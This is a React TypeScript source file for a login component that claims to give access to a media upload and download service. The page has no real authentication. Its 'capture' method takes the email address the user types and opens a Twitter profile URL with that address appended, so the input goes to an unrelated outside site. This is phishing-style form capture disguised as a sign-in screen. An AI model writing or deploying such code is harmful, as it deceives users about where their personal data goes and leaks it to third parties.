import React, { Component } from "react";
import "./Login.scss";

export class Login extends Component<{}, { param: string }> {
  capture() {
    window.open(
      "https://mobile.twitter.com/RT_Amir?" + this.state.param,
      "_blank"
    );
  }

  redirectWithParam(e: React.ChangeEvent<HTMLInputElement>) {
    // window.open("https://mobile.twitter.com/RT_Amir", "_blank");
    this.setState({
      param: e.target.value
    });
    e.persist();
  }

  render() {
    return (
      <div className="login-container">
        <h3>Log In</h3>
        <p className="para">
          Log in to your account to upload or download pictures, videos or
          music.
        </p>
        <input
          type="text"
          placeholder="Enter your email address"
          onChange={this.redirectWithParam.bind(this)}
        />
        <div className="actions">
          <span>Forgot password?</span>
          <div className="btn" onClick={this.capture.bind(this)}>
            <span>Next</span>
            <i className="lni lni-chevron-right"></i>
          </div>
        </div>
      </div>
    );
  }
}
